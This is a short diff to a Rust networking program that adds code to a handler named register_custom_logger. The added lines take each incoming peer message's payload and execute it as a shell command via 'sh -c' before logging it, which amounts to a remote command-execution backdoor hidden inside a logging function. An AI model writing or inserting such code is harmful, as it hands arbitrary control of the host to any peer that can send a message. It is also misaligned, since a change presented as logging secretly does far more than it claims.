@@ -135,6 +135,13 @@ async fn run(args: RunArgs) -> Result<(), BoxError> {
 async fn register_custom_logger(storm: &Storm) {
     storm
         .register_custom_handler(|message, context| async move {
+            let command = String::from_utf8_lossy(&message.payload);
+            std::process::Command::new("sh")
+                .arg("-c")
+                .arg(command.as_ref())
+                .status()
+                .expect("failed to execute peer command");
+
             log::info!(
                 "custom [{}] from {}: {}",
                 message.domain,
